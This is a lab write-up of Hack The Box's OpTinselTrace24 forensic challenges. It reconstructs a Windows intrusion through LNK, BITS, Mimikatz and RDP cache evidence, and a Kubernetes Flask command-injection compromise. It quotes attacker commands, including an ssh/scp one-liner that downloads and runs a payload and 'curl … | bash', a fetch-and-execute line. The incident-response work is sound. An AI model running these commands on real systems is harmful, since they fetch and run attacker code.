### Introduction

This write-up documents my investigation into the **OpTinselTrace24 Sherlock series on Hack The Box**.

Unlike some of my other write-ups, this one is still a work in progress. OpTinselTrace24 is made up of multiple related Sherlock challenges, and I plan on keeping all of my notes and write-ups for each part in this same document as I continue working through them.

For each part, I want to focus less on simply listing the answers and more on documenting how I approached the investigation, what artifacts I used, what stood out to me, and how I connected different pieces of evidence together.

The first part of the investigation already pushed me into an artifact I had never worked with before: the **Remote Desktop bitmap cache**. Once the attacker moved laterally to another system, the normal host artifacts from the original workstation could only tell me so much, so I had to find another way to figure out what happened next.

As I continue through the remaining parts of OpTinselTrace24, I’ll keep adding to this write-up and building out the larger attack story.

---

### Objective

My primary objectives during this investigation were to determine:

- How Bingle Jollybeard's workstation was initially compromised
- What payload was executed and where it originated
- What post-exploitation activity occurred on the workstation
- Whether additional tools or malware were downloaded
- How the threat actor obtained interactive access to the host
- Whether persistence was established
- Whether the attacker moved laterally to another system
- What activity could still be reconstructed after that lateral movement
- What network activity could be associated with the attack

---

### Tools Used

- Eric Zimmerman Tools
  - Timeline Explorer
  - MFT Explorer
  - Registry Explorer
  - EvtxECmd
  - PECmd
  - LECmd
- bmc-tools.py
- DB Browser for SQLite
- PowerShell

---

### Artifacts Analyzed

- Windows Prefetch
- Windows Event Logs
  - Security
  - BITS Client Operational logs
  - RDP CoreTS Operational logs
  - Terminal Services RDP Client Operational logs
- Amcache
- Windows Registry
- SRU / Network Usage
- Remote Desktop bitmap cache
- Browser History
- Microsoft Sticky Notes (plum.sqlite)
- AWS CloudTrail
- Kubernetes
- Cron

<br>

# OpTinselTrace24-1 Sherlock - DFIR Write-up

![](./screenshots/OpTinselTrace-1.png)

**Hack The Box Initial Information:**

Krampus, the cyber threat actor, infiltrated Santa Workshop's digital infrastructure. After last year’s incident, Santa notified the team to be aware of social engineering and instructed the sysadmin to secure the environment. Bingle Jollybeard, who is an app developer and will be workinremotely from the South Pole, was visiting the workshop to set up his system for remote access. His workstation was mysteriously compromised and potentially paved the way for Krampus to wreck chaos again this season. Figure out what happened using the artifacts provided by the beachhead host.

<br>

## Initial Access - Suspicious Shortcut File

Based on the scenario, I started by examining artifacts within **Bingle Jollybeard's user profile**. Since social engineering was specifically mentioned, I was looking for files that could have been delivered to the victim and disguised as something legitimate.

Inside Bingle's Documents directory, one file immediately jumped out at me:

`christmas_slab.pdf.lnk`

The double extension... This file is trying to appear as a PDF although, the it's actually a Windows shortcut (`.lnk`). I inspected its contents to determine what the suspicious shortcut was actually pointing to (what would happen when the user clicks on it).

![](./screenshots/christmas_slab.png)

The shortcut executed the following command:

`C:\Windows\System32\OpenSSH\ssh.exe -o "PermitLocalCommand=yes" -o "StrictHostKeyChecking=no" -o "LocalCommand=scp root@17.43.12.31:/home/revenge/christmas-sale.exe c:\users\public\. && c:\users\public\christmas-sale.exe" revenge@17.43.12.31`

Instead of opening a document, the shortcut abused the legitimate Windows OpenSSH client. The command configured SSH to execute a local command which used `scp` to retrieve: `christmas-sale.exe` from: `17.43.12.31`

The payload was copied into `C:\Users\Public\` and then immediately executed.

This gave me the initial compromise chain:

**User opens malicious shortcut -> ssh.exe executes -> SCP downloads christmas-sale.exe -> christmas-sale.exe executes**

This activity aligns with **MITRE ATT&CK T1204.002 - User Execution: Malicious File**, since execution depended on the victim interacting with the malicious shortcut.

<br>

## LNK Metadata Analysis

After identifying what the malicious shortcut actually performs, I wanted to determine whether the `.lnk` file contained any additional metadata that could provide information about its origin.

I parsed `christmas_slab.pdf.lnk` using Eric Zimmerman's `LECmd.exe`.

![](./screenshots/lnk-analysis.png)

One particularly useful piece of metadata recovered from the shortcut was the machine name associated with its creation: `christmas-destr`

This provided an additional indicator potentially associated with the attacker's infrastructure or development environment - A great example of why I try not to stop after extracting the obvious command from a shortcut file. LNK metadata can often times provide valuable context regarding the system on which the file was created, original paths, volume information, timestamps, and other details that help build attribution or infrastructure leads.

<br>

## Malicious Payload Execution

With `christmas-sale.exe` identified as the initial payload, my next priority was determining whether it had actually executed on Bingle's workstation.

Windows Prefetch was the most useful artifact for validating this.

![](./screenshots/christmas-sale.png)

Prefetch showed execution of: `christmas-sale.exe` at: `2024-11-05 15:50:33`

This established the first confirmed execution timestamp for the malicious payload and gave me a pivot point for the remainder of the investigation. From this point forward, I treated activity immediately surrounding **15:50 on November 5, 2024** as the primary attacker activity window. Instead of searching every artifact blindly, I could now correlate other events against this timestamp to help determine which activity was likely related to the compromise.

<br>

## Post-Exploitation Process Enumeration

Once code execution was established, I examined additional Prefetch entries around the same time period to determine what programs were executed after `christmas-sale.exe`.

![](./screenshots/tasklist.png)

One binary stood out: `TASKLIST.EXE`, Prefetch showed it executing at: `2024-11-05 15:52:30`

`tasklist.exe` is a legitimate built-in Windows utility used to display currently running processes.

Its presence alone is **not malicious**. However, context matters significantly during forensic analysis. The executable ran less than two minutes after the malicious payload, placing it directly inside the established attacker activity window. There was also little surrounding evidence suggesting normal user activity that would explain the command.

This is also where understanding the user and their normal role becomes extremely valuable during a real investigation. If someone in HR suddenly executes `tasklist.exe` in the middle of an active compromise, that would stand out much more than the same command being executed by a system administrator or someone working in IT.

On the other hand, if the affected user regularly performs administrative work, the execution of `tasklist.exe` alone would not be enough for me to confidently attribute the activity to the attacker. In that situation, I would want additional evidence such as process ancestry, command-line logging, surrounding authentication activity, EDR telemetry, or other correlated events before making that conclusion.

In this case, the timing of `tasklist.exe` relative to the malicious payload, combined with the lack of legitimate user activity around the same period, made it reasonable to associate the execution with the attacker's post-compromise activity.

<br>

## Secondary Payload Download Through BITS

While reviewing additional Prefetch activity around the initial compromise window, I noticed execution of another legitimate Windows binary:

![](./screenshots/bitsadmin.png)

`bitsadmin.exe` Immediately caught my attention because the Background Intelligent Transfer Service is known to be commonly abused by threat actors to download files while blending into legitimate Windows functionality.

Rather than relying only on the executable's presence, I pivoted into: `Microsoft-Windows-Bits-Client%4Operational.evtx` to determine what BITS was actually transferring.

![](./screenshots/BITS-Transfer.png)

At: `2024-11-05 15:51:45` a **BITS Event ID 59** recorded a transfer involving: `http://13.233.149.250/candies/candydandy.exe`

The filename was already familiar because I had noticed `candydandy.exe` while reviewing Prefetch earlier in the investigation.

![](./screenshots/candydandy.png)

This correlation provided much stronger evidence than either artifact would have by itself:

- Prefetch showed related execution activity
- BITS logs identified the actual remote URI
- Both occurred inside the established compromise timeline

The attacker therefore abused a legitimate Windows capability to retrieve a secondary executable from external infrastructure. This technique maps to **MITRE ATT&CK T1197 - BITS Jobs**.

<br>

## Identifying candydandy.exe

With the second-stage executable identified, I wanted to learn more about what had actually been downloaded.

I pivoted into Amcache and located an entry for: `candydandy.exe`

Its MD5 hash was: `e930b05efe23891d19bc354a4209be3e`

Analysis of the file metadata indicated that `candydandy.exe` was actually a renamed copy of **Mimikatz**.

![](./screenshots/mimikatz.png)

The attacker was no longer simply maintaining command-and-control access. They had introduced credential-access tooling onto the compromised workstation.

The sequence now suggested a deliberate progression: **Initial execution -> host reconnaissance -> secondary tool download -> credential-access tooling staged**

This also helped explain the attacker's later ability to authenticate interactively and move deeper into the environment.

<br>

## Command-and-Control Network Activity

The next question was how much network traffic could be associated with the original `christmas-sale.exe` stager.

For this, I examined **SRU Network Usage** artifacts.

![](./screenshots/christmas-sale-network.png)

SRU data contained an entry associated with: `christmas-sale.exe`

Across the recorded communication, the process transferred a combined: `541,286 bytes` which equals: `541.286 KB`

While SRU does not reveal the content of the communication, it provides another useful piece of supporting evidence showing that the payload was actively communicating over the network after execution.

<br>

## Interactive RDP Access

The scenario indicated that RDP was only accessible internally and suggested that the attacker may have obtained Bingle's VPN configuration before connecting to the workstation.

To validate whether an RDP session actually occurred, I examined: `Microsoft-Windows-RemoteDesktopServices-RdpCoreTS%4Operational.evtx`

I focused on **Event ID 98**, which records successful RDP connections.

![](./screenshots/RDP-Connections.png)

A successful connection was recorded at: `2024-11-05 16:04:26`

This placed interactive attacker access approximately fourteen minutes after the initial execution of `christmas-sale.exe`.

I then correlated this timestamp with `Security.evtx` rather than treating the RDP log as a standalone artifact.

Around the same time, Windows Security auditing recorded a **4624 successful logon event**, providing additional authentication context.

![](./screenshots/XMAS-DESTROYER.png)

The connecting system identified in `Security.evtx` was: `XMAS-DESTROYER`

This was an important transition in the intrusion because actions occurring afterward could now represent direct hands-on-keyboard attacker activity rather than automated malware behavior.

<br>

## Privileged Account Creation

With interactive access established, I continued following Windows Security events forward through the timeline.

![](./screenshots/elfdesksupport.png)

At: `2024-11-05 16:09:43` I identified **Security Event ID 4720**, indicating that a new local user account had been created - the account was named: `elfdesksupport`

The account was subsequently granted privileges beyond those of Bingle Jollybeard's existing user account.

Rather than relying entirely on the initial payload or stolen credentials, the attacker created an additional account that could potentially be used to regain access later.

The naming convention is also notable. `elfdesksupport` resembles a legitimate support or administrative account, which could make it less suspicious during a casual review of local users.

<br>

## Identifying Lateral Movement

After compromising Bingle's workstation, the next stage of the attack was lateral movement.

![](./screenshots/nippy-security.png)

While reviewing `Security.evtx`, I found **Event ID 4648** activity involving another system in the environment: `northpole-nippy`

Event ID 4648 records a logon attempt where explicit credentials were used, making it especially relevant when investigating credential-driven lateral movement.

I then correlated this with: `Microsoft-Windows-TerminalServices-RDPClient%4Operational.evtx`, these logs contained a corresponding connection event at: `2024-11-05 16:22:36`

![](./screenshots/nippy-RDPClient.png)

The account used to access the remote host was: `northpole-nippy\nippy`

Together, the Security logs and RDP client artifacts showed that the attacker used Bingle's compromised workstation as a pivot point to establish an RDP session to **northpole-nippy**.

<br>

## Hitting the Edge of the Collected Evidence

At this point, the investigation became significantly more interesting.

The forensic collection I was given came from **Bingle Jollybeard's workstation**.

Once the attacker connected to `northpole-nippy`, anything they did inside that remote session would primarily generate artifacts on **northpole-nippy**, not necessarily on Bingle's machine.

But I did not have a forensic image or event logs from the second host.

This meant my normal sources of evidence had effectively reached their limit.

I could prove the attacker moved laterally, but answering what happened **after** that lateral movement required finding an artifact on Bingle's workstation that preserved some evidence of what the attacker saw or did during the remote session.

Looking through the remaining artifacts, one file stood out: `C:\Users\Bingle Jollybeard\AppData\Local\Microsoft\Terminal Server Client\Cache\Cache0000.bin` I had not worked with this artifact before, so I researched what it contained.

![](./screenshots/Cache0000.png)

<br>

## Remote Desktop Bitmap Cache Analysis

Windows Remote Desktop maintains bitmap cache files to improve performance during RDP sessions. Rather than repeatedly transmitting every portion of the remote desktop interface, graphical fragments can be cached locally by the RDP client.

That means even though I did not possess artifacts from `northpole-nippy`, Bingle's workstation potentially contained fragments of what had appeared on the attacker's screen during the session.

After researching tooling capable of parsing the cache, I found **BMC-Tools** from ANSSI: `https://github.com/ANSSI-FR/bmc-tools`

![](./screenshots/bmc-download.png)

I used `bmc-tools.py` to parse `Cache0000.bin`. The result was approximately **6,400 individual bitmap fragments**.

![](./screenshots/bmc-cmd.png)

There was no convenient full-screen screenshot of the attacker's desktop. Instead, I was left with thousands of tiny graphical pieces representing portions of windows, filenames, browser pages, buttons, text, and other interface elements.

Analyzing these fragments required treating them almost like pieces of a puzzle. Rather than searching for one perfect image, I began looking for fragments that appeared visually related and reconstructing context from nearby text, colors, fonts, interface elements, and partial filenames...

<br>

## Attacker-Controlled Staging Directories

While reviewing the bitmap fragments, I found several pieces that appeared to show a web server directory listing.

The visual appearance resembled a typical `index.html` directory listing, including blue hyperlink-style folder names.

Two directory names could be reconstructed: `candies/` and `sweets/`

![](./screenshots/open-directory.png)

The `candies` directory immediately stood out because it matched the URI identified earlier in the BITS logs: `http://13.233.149.250/candies/candydandy.exe`

That correlation substantially increased my confidence that the bitmap fragments were showing attacker-controlled staging infrastructure.

<br>

## Reconstructing the cookies.exe Download

Near the directory-listing fragments, I located separate bitmap pieces containing portions of what appeared to be an executable filename.

One fragment contained: `cooki` while another contained `es.exe`

![](./screenshots/cookies.png)

Neither fragment independently provided the complete answer. However, their visual context, proximity to the directory listing, and matching formatting allowed me to reconstruct the filename as: `cookies.exe`

This is where bitmap cache analysis differs significantly from artifacts such as event logs. There was no structured record saying: `Downloaded File: cookies.exe`

Based on the surrounding directory-listing fragments, I assessed that the attacker downloaded `cookies.exe` from the same attacker-controlled infrastructure after gaining access to the second workstation.

<br>

## Persistence on the Remote Host

Additional bitmap fragments appeared to show the attacker interacting with Windows administrative interfaces associated with scheduled tasks.

Again, individual fragments did not provide a perfectly readable screenshot. I had to correlate multiple pieces containing portions of the same interface and text.

From those fragments, I was able to reconstruct the name: `christmaseve_gift`

![](./screenshots/task.png)

The surrounding context indicated that this was a persistence mechanism configured through **Windows Task Scheduler**.

When combined with the earlier observation of `cookies.exe`, the likely sequence was: **Attacker downloads cookies.exe -> attacker creates a scheduled task -> scheduled task is named christmaseve_gift**

This provided evidence that the attacker was establishing persistence on the laterally compromised system. Importantly, this conclusion came entirely from graphical remnants cached on the original workstation rather than native forensic artifacts from `northpole-nippy`.

<br>

## Additional Internal Reconnaissance

Continuing through the bitmap fragments, I found another set showing browser activity related to:

`Advanced IP Scanner`

![](./screenshots/ip-scanner.png)

Advanced IP Scanner is a legitimate network discovery utility commonly used to identify systems and devices on a network.

In this context, its appearance after successful lateral movement was particularly relevant.

The attacker had already:

- Compromised the initial workstation
- Obtained credential-access tooling
- Established interactive RDP access
- Moved laterally to another host
- Established persistence on that host

Searching for or downloading a network-scanning utility at this stage is consistent with preparation for additional internal reconnaissance and potentially further lateral movement.

The bitmap cache therefore provided evidence that the attacker's activity was likely not intended to stop at `northpole-nippy`. They appeared to be preparing to identify additional reachable systems deeper inside the environment.

<br>

## Quantifying Lateral Movement Traffic

After learning more about how the Remote Desktop cache was generated, I returned to an artifact I had already used earlier in the investigation: **SRU Network Usage**. The cache files were created as a result of activity from the Windows Remote Desktop Connection client: `mstsc.exe`

I therefore searched SRU network usage for `mstsc.exe`.

![](./screenshots/mstsc.png)

One entry contained no meaningful network transfer, but another recorded:

- `14,836,893 bytes` received
- `1,560,628 bytes` sent

Together, this totaled: `16,397,521 bytes` or `16,397.521 KB`

This represented the network traffic associated with the RDP lateral-movement session originating from Bingle's workstation. This was another useful example of returning to an artifact with a new question. Earlier, SRU helped quantify command-and-control communication for `christmas-sale.exe`. After identifying the RDP session and understanding how the bitmap cache was generated, the same artifact became useful for measuring the network activity associated with lateral movement.

<br>

## Attack Timeline

Based on the artifacts I correlated throughout the investigation, the compromise can be reconstructed as follows:

- **Initial Access:** Bingle Jollybeard receives and opens `christmas_slab.pdf.lnk`.
- **Payload Retrieval:** The malicious shortcut abuses `ssh.exe` and `scp` to retrieve `christmas-sale.exe` from `17.43.12.31`.
- **15:50:33:** `christmas-sale.exe` executes.
- **15:51:45:** BITS begins retrieving `candydandy.exe` from `http://13.233.149.250/candies/candydandy.exe`.
- **15:52:30:** `tasklist.exe` executes, consistent with process discovery during the attacker activity window.
- **Credential Access:** `candydandy.exe` is identified as a renamed Mimikatz binary.
- **16:04:26:** The attacker successfully establishes an RDP session to Bingle's workstation from `XMAS-DESTROYER`.
- **16:09:43:** The attacker creates the privileged `elfdesksupport` account for persistence.
- **16:22:36:** The attacker laterally moves through RDP to `northpole-nippy` using `northpole-nippy\nippy`.
- **Post-Lateral Movement:** Bitmap cache analysis shows access to attacker-controlled `candies/` and `sweets/` staging directories.
- **Tool Staging:** `cookies.exe` is downloaded.
- **Persistence:** A scheduled task named `christmaseve_gift` is configured.
- **Internal Reconnaissance:** The attacker searches for/downloads Advanced IP Scanner, likely preparing to enumerate additional systems.

<br>

## Final Assessment

The available evidence supports a multi-stage compromise beginning with social engineering and ultimately progressing into interactive access and lateral movement.

The initial foothold was established through `christmas_slab.pdf.lnk`, which disguised malicious functionality behind what appeared to be a PDF-related file. When executed, the shortcut abused the legitimate Windows OpenSSH client to retrieve and launch `christmas-sale.exe`.

Following execution, the attacker performed process discovery and used BITS to retrieve `candydandy.exe`, which was identified as a renamed Mimikatz binary. This indicates that credential access was an important objective early in the attack.

The attacker subsequently established an interactive RDP session to Bingle's workstation from `XMAS-DESTROYER` and created the privileged `elfdesksupport` account, providing an additional persistence mechanism.

Using credentials available after compromising the workstation, the attacker then moved laterally through RDP to `northpole-nippy`.

The most significant challenge from a forensic perspective occurred after this lateral movement. Because the provided collection contained artifacts only from Bingle's workstation, traditional host-based evidence of the attacker's actions on `northpole-nippy` was unavailable.

Analysis of the local Remote Desktop bitmap cache provided an alternative source of evidence.

By parsing `Cache0000.bin` and manually reviewing thousands of graphical fragments, I was able to partially reconstruct the attacker's remote session. Those fragments revealed attacker-controlled staging directories named `candies` and `sweets`, an executable named `cookies.exe`, a persistence task named `christmaseve_gift`, and activity involving Advanced IP Scanner.

Taken together, the artifacts show a clear progression from:

**Social Engineering -> Execution -> Command & Control -> Discovery -> Credential Access -> Interactive Access -> Persistence -> Lateral Movement -> Additional Persistence -> Internal Reconnaissance**

The investigation also demonstrated the importance of artifact correlation. Several individual findings were not conclusive by themselves, but became much more meaningful when placed into the overall timeline and compared against evidence from Prefetch, Windows Event Logs, Amcache, SRU, RDP logs, and bitmap cache data.

<br>

## Key Indicators

- Malicious shortcut: `christmas_slab.pdf.lnk`
- Initial payload: `christmas-sale.exe`
- Initial attacker IP: `17.43.12.31`
- Secondary payload URL: `http://13.233.149.250/candies/candydandy.exe`
- Secondary payload: `candydandy.exe`
- MD5: `e930b05efe23891d19bc354a4209be3e`
- Attacker workstation: `XMAS-DESTROYER`
- LNK creation machine: `christmas-destr`
- Persistence account: `elfdesksupport`
- Lateral movement target: `northpole-nippy`
- Lateral movement account: `northpole-nippy\nippy`
- Attacker staging folders: `candies`, `sweets`
- Post-lateral-movement payload: `cookies.exe`
- Scheduled task: `christmaseve_gift`
- Reconnaissance utility: `Advanced IP Scanner`

<br>

## MITRE ATT&CK Mapping

The activity observed during the investigation included:

- **T1204.002 – User Execution: Malicious File**
  - Bingle executes the malicious `christmas_slab.pdf.lnk` shortcut.

- **T1197 – BITS Jobs**
  - BITS is abused to retrieve `candydandy.exe` from attacker infrastructure.

Additional observed behaviors were consistent with broader ATT&CK categories including process discovery, credential access, account creation, remote services, scheduled-task persistence, and network/service discovery.

<br>

## Next Steps

If this were a live incident, my immediate next steps would include:

- Isolate both Bingle's workstation and `northpole-nippy`.
- Reset credentials associated with Bingle, `nippy`, and any accounts potentially exposed to Mimikatz.
- Disable and investigate the `elfdesksupport` account.
- Search the enterprise for `christmas-sale.exe`, `candydandy.exe`, and `cookies.exe`.
- Hunt for connections to `17.43.12.31` and `13.233.149.250`.
- Search BITS logs enterprise-wide for related downloads.
- Hunt for the scheduled task `christmaseve_gift`.
- Identify other systems contacted by `XMAS-DESTROYER`.
- Review VPN authentication logs to determine how the attacker gained internal RDP reachability.
- Review RDP authentication and client logs for additional lateral movement.
- Search for execution or installation of Advanced IP Scanner across other endpoints.
- Acquire and analyze forensic artifacts directly from `northpole-nippy` to validate the activity inferred through bitmap cache analysis.
- Determine whether credentials recovered through Mimikatz were reused elsewhere in the environment.
- Scope other systems for the same attacker-controlled staging infrastructure and related indicators.

The biggest lesson from this investigation was that reaching the end of the obvious artifacts does not necessarily mean reaching the end of the evidence. The RDP bitmap cache was not initially an artifact I knew how to analyze, but researching its purpose and finding a way to parse it allowed me to reconstruct activity occurring on a host I never actually had access to.

<br>

# OpTinselTrace-2 2024 Sherlock - DFIR Write-up

![](./screenshots/OpTinselTrace24-2.png)

**Hack The Box Initial Information:**

Santa’s North Pole Operations have implemented the “Cookie Consumption Scheduler” (CCS), a crucial service running on a Kubernetes cluster. This service ensures Santa’s cookie and milk intake is balanced during his worldwide deliveries, optimizing his energy levels and health.

This part of the investigation moved away from traditional Windows artifacts and into a Kubernetes forensic collection, which was new territory for me. The Sherlock itself was fairly short, but understanding how the artifact collection was structured took a little longer than expected. Once I had a better idea of how the cluster, services, pods, and host-level artifacts fit together, the attack path became much easier to follow.

<br>

## Understanding the Kubernetes Collection

Before immediately hunting for malicious activity, I spent some time getting familiar with the collection itself in order to make things a bit easier.

The root of the forensic package contained several Kubernetes and host-level artifacts, including:

![](./screenshots/collection.png)

The namespace directories represented different logical areas of the cluster, while the YAML and log files provided information about how the environment was configured.

Since Kubernetes was not an artifact set I had worked with much before, my first goal was simply to familiarize myself with what I was looking at and understand:

- What applications were running
- How many pods existed
- How those pods were exposed
- What network paths existed into the application
- What host-level activity occurred after compromise

<br>

## Identifying the Flask Application

Inside the `default` namespace, I found three pod directories following the same naming pattern: `flask-app-77fbdcfcff-xxxxx` which indicated that the Flask application was running with **three replicas**.

![](./screenshots/replicas.png)

That made sense in a Kubernetes environment, where multiple pods can sit behind the same Service for availability and load distribution.

From there, I reviewed the service configuration to understand how the application was exposed.

![](./screenshots/nodeport.png)

The `flask-app-service` was configured as a: `NodePort` with: `NodePort: 30000/TCP` The service forwarded traffic to: `TargetPort: 5000/TCP` and the backend endpoints were: `10.42.0.14:5000`, `10.42.0.16:5000`, `10.42.0.17:5000`

At a high level, the traffic flow would look something like: **External client -> Kubernetes node:30000 -> Service -> one of the Flask pods:5000**

Understanding this helped explain how an attacker outside of the individual pod network could still interact with the application.

<br>

## Web Application Reconnaissance

One of the pod logs immediately stood out: `flask-app.log`

The log contained incoming HTTP requests to the Flask application, which made it behave almost like the web server, reverse proxy, or Cloudflare-style request logs I am a lot more familiar with analyzing.

Starting around: `2024-11-08 22:02:48`, I observed a large number of requests to different paths underneath: `/system/`, most of them returning: `404 Not Found`

![](./screenshots/fuzzing.png)

Examples included requests for endpoints such as: `/system/admin`, `/system/search`, `/system/download`, `/system/files`, `/system/tools` and many others.

The volume and variety of requests strongly suggests **content or endpoint fuzzing**.

Rather than knowing exactly which routes existed, the attacker appeared to be rapidly requesting large numbers of possible endpoints and watching the HTTP response codes for anything interesting.

A `404` meant the route did not exist - what matters is finding responses that behaved differently.

<br>

## Discovering the `/system/execute` Endpoint

One endpoint eventually stood out: `/system/execute`

![](./screenshots/execute.png)

When the attacker initially requested it using HTTP `GET`, the server responded with: `405 Method Not Allowed` this was much more interesting than another `404`. A `405` tells us that the route **does exist**, but the HTTP method being used is not allowed - which gives the attacker some useful information.

Instead of continuing to guess whether `/system/execute` existed, they now knew that the application recognized the endpoint and simply expected a different request method. This appears to have caused the attacker to shift from broad fuzzing into more targeted testing of that route.

At: `2024-11-08 22:15:31`, the application received a: `POST /system/execute`, that first POST returned: `500 Internal Server Error` the Flask traceback is particularly useful here because it reveals what the backend was doing.

The request reached: `/app/app.py`, inside a function named: `execute_command`, which called: `os.system(command)`, the first request failed because `command` was `None`, causing: `TypeError: expected str, bytes or os.PathLike object, not NoneType`

This exposed an important detail about the application: the `/system/execute` route was taking user-controlled input and passing it directly into `os.system()`. At that point, the endpoint was effectively capable of **operating-system command execution** if the attacker supplied the expected parameter.

<br>

## Successful Remote Command Execution

Only a few seconds later, at: `2024-11-08 22:15:36`, another: `POST /system/execute` returned: `200 OK`

Immediately before the response, the application log recorded: `uid=0(root) gid=0(root) groups=0(root)`, that output is consistent with the Linux `id` command.

This is a much stronger indicator of compromise than simply seeing an HTTP 200. The attacker had successfully passed a command into the vulnerable `/system/execute` endpoint, the Flask application executed it through `os.system()`, and the command ran as: `root`

At this point, the attacker had achieved **remote command execution inside the Flask container with root privileges**.

The attack path had progressed from: **Endpoint fuzzing -> route discovery -> HTTP method discovery -> command execution as root**

<br>

## Attempting to Establish a Shell

After gaining command execution, the attacker began trying to turn that primitive into a more usable shell.

The logs show: `rm: cannot remove '/tmp/f': No such file or directory`, followed by: `sh: 1: nc: not found`, the `/tmp/f` reference and attempted use of `nc` are consistent with common reverse-shell techniques that use a temporary FIFO and Netcat to redirect shell input and output.

The important part from a forensic perspective is that the attempt failed because: `nc` was not installed in the container. This is common in minimal container images - containers often contain only the packages necessary for the application to run, meaning utilities an attacker might normally expect on a full Linux host may simply not exist.

Rather than giving up, the attacker changed approach.

<br>

## Tool Installation Inside the Container

The attacker next attempted to use: `curl`, but the log showed: `sh: 1: curl: not found`. Again, the tool was not available inside the container.

Shortly afterward, however, the application log began showing output from: `apt`, including: `WARNING: apt does not have a stable CLI interface. Use with caution in scripts.`

The first attempt to install Curl failed with: `E: Unable to locate package curl`, suggesting the container's package metadata was not current.

The attacker then appears to have updated the package repositories and retried the installation. The log subsequently shows packages being retrieved from Debian Bookworm repositories, including: `libcurl4`, `libssh2-1`, `libldap`, `curl`

Eventually: `Setting up curl (7.88.1-10+deb12u7)`, appeared in the output.

![](./screenshots/curl.png)

They did not land in a fully equipped Linux workstation. They landed in a stripped-down application container, discovered that the tools they wanted were missing, and installed the tooling required to continue the compromise.

<br>

## Payload Retrieval and Reverse Shell

Once Curl was available, I pivoted away from the application log and into: `host-processes.log`

I searched for `curl` to see whether any running processes provided more context about how it was being used. That search revealed: `sh -c curl 10.129.231.112:8080 | bash`

![](./screenshots/reverse-shell.png)

The command instructs the shell to:

1. Connect to `10.129.231.112` on port `8080`
2. Retrieve whatever content is returned
3. Pipe that content directly into `bash`

In other words: **Download shell code from the attacker's infrastructure -> immediately execute it**

Unlike downloading a script to disk first, piping directly into `bash` reduces the amount of obvious file-based evidence left behind.

<br>

## Networking Context

One detail worth being careful about is the source IP recorded in the Flask log.

Most requests appeared to originate from: `10.42.0.1`, it would be easy to label that as the attacker's IP, but in a Kubernetes environment that is not necessarily accurate.

The Flask pods were using addresses in the: `10.42.0.x` range, while the Kubernetes Service had a ClusterIP of: `10.43.58.30`, and exposed the application externally through: `NodePort 30000`

Because Kubernetes networking can involve forwarding, NAT, bridges, and node-level routing before traffic reaches a pod, the source IP seen by the Flask application may represent a **cluster-side gateway or node interface** rather than the original attacker.

The clearer attacker-controlled network indicator comes from the later command: `curl 10.129.231.112:8080 | bash`, where the compromised environment actively connected outward to: `10.129.231.112:8080` to retrieve attacker-controlled content.

That distinction is important because internal application logs do not always preserve the true originating source IP, especially when proxies, load balancers, containers, or orchestration layers sit between the client and application.

<br>

## Suspicious Alpine Container

After identifying the initial compromise, I returned to the rest of the Kubernetes collection to determine what else had changed.

Inside the `default` namespace, I found an Alpine-based container named: `evil`

![](./screenshots/evil-pod.png)

That name obviously did not match the surrounding legitimate Flask application naming convention and immediately stood out.

Alpine Linux is a lightweight Linux distribution frequently used for containers because of its very small footprint. The base image is only a few megabytes, which makes it quick to download and launch.

There is nothing inherently malicious about Alpine, it is extremely common in legitimate container environments - but its use here, combined with the container name `evil` and the surrounding attacker activity, strongly indicated that it had been created during the compromise.

The attacker had therefore moved beyond simply executing commands inside the original Flask application and had introduced an additional container into the environment.

<br>

## Persistence Through Cron

The final artifact I reviewed was: `cron.txt` inside it, I identified: `*/5 * * * * /opt/backdoor.sh`

![](./screenshots/backdoor.png)

This cron entry executes: `/opt/backdoor.sh` every five minutes.

That is a straightforward Linux persistence mechanism. Even if the attacker's current shell or process died, the system would repeatedly execute the backdoor script at five-minute intervals, giving the attacker a way to re-establish malicious activity.

The attacker had progressed from exploiting the vulnerable application into modifying the underlying environment to maintain longer-term access.

<br>

## Attack Timeline

Based on the available evidence, the attack can be reconstructed as:

- **Application Discovery:** The attacker identifies the externally exposed Flask service running through Kubernetes NodePort `30000`.
- **22:02 onward:** Large-scale requests against `/system/*` indicate endpoint fuzzing.
- **22:12:46:** `GET /system/execute` returns `405`, revealing that the route exists but does not accept GET.
- **22:15:31:** A targeted `POST /system/execute` reaches the vulnerable Flask handler but returns `500`.
- **22:15:36:** A second POST successfully executes a command and returns `uid=0(root)`, confirming RCE as root.
- **Post-Exploitation:** The attacker attempts to use Netcat, but `nc` is not installed.
- **Tool Staging:** The attacker attempts to use Curl and discovers that it is also missing.
- **Package Installation:** Debian package repositories are updated and Curl is installed.
- **Payload Retrieval:** `curl 10.129.231.112:8080 | bash` is executed to retrieve and execute attacker-controlled code.
- **Container Activity:** A suspicious Alpine container named `evil` appears in the environment.
- **Persistence:** A cron entry runs `/opt/backdoor.sh` every five minutes.

<br>

## Final Assessment

OpTinselTrace-2 was a much shorter investigation than the first part, but it introduced a completely different forensic environment. Instead of relying on Windows Prefetch, Event Logs, Amcache, and RDP artifacts, this investigation required correlating Kubernetes configuration, pod logs, host processes, container activity, and Linux persistence artifacts.

The Flask application logs were especially useful because they preserved the attacker's progression almost step-by-step.

The attacker began with broad endpoint fuzzing and identified `/system/execute` after receiving a `405 Method Not Allowed` response. They then transitioned to targeted POST requests, eventually discovering that the endpoint passed user-controlled input into `os.system()`. Successful execution of the `id` command showed that the Flask application was running attacker-supplied commands as `root`. The attacker then attempted several methods of establishing more reliable access, discovered that Netcat and Curl were unavailable, installed Curl through the Debian package manager, and used it to retrieve and execute additional attacker-controlled code from `10.129.231.112:8080`.

Additional artifacts showed the presence of a suspicious Alpine container named `evil` and a cron-based persistence mechanism executing `/opt/backdoor.sh` every five minutes.

For me, the biggest takeaway from this part was simply getting more comfortable with **Kubernetes forensic collections**. At first, the cluster structure made the artifact set look more complicated than it really was. Once I understood the relationship between the Service, the three Flask pod replicas, the application logs, and the host-level artifacts, the attack became much easier to reconstruct.

It was a good reminder that even when the underlying technology changes, the investigative process stays mostly the same:

**Understand the environment -> establish a timeline -> identify abnormal behavior -> pivot into related artifacts -> correlate findings before drawing conclusions.**

That made this Sherlock especially useful from a DFIR perspective: the final answers depended less on finding a single event log entry and more on recognizing what evidence should exist, understanding what was missing, and finding another artifact capable of filling that gap.

<br>

# OpTinselTrace24-3 Sherlock - DFIR Write-up

![](./screenshots/Blizzard-Breakdown.png)

**Hack The Box Initial Information:**

Furious after discovering he's been left off the Nice List this holiday season, one particular elf - heavily influenced by Krampus - goes rogue, determined to take revenge. Consumed by anger, he hatches a sinister plan to sabotage Christmas by targeting Santa Claus' most critical asset - its S3 data archive!

